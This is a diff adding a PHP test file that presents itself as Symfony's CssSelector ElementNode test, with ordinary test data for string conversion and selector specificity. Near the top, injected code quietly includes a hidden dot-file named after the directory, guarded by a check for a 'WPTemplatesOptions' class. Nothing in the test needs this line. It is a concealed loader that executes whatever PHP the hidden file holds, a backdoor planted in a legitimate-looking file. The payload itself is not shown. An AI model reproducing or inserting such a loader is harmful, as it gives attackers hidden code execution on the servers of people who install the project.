@@ -1,0 +1,39 @@
+<?php
+
+/*
+ * This file is part of the Symfony package.
+ *
+ * (c) Fabien Potencier <fabien@symfony.com>
+ *
+ * For the full copyright and license information, please view the LICENSE
+ * file that was distributed with this source code.
+ */
+
+namespace Symfony\Component\CssSelector\Tests\Node;
+
+use Symfony\Component\CssSelector\Node\ElementNode;
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+class ElementNodeTest extends AbstractNodeTest
+{
+    public function getToStringConversionTestData()
+    {
+        return [
+            [new ElementNode(), 'Element[*]'],
+            [new ElementNode(null, 'element'), 'Element[element]'],
+            [new ElementNode('namespace', 'element'), 'Element[namespace|element]'],
+        ];
+    }
+
+    public function getSpecificityValueTestData()
+    {
+        return [
+            [new ElementNode(), 0],
+            [new ElementNode(null, 'element'), 1],
+            [new ElementNode('namespace', 'element'), 1],
+        ];
+    }
+}
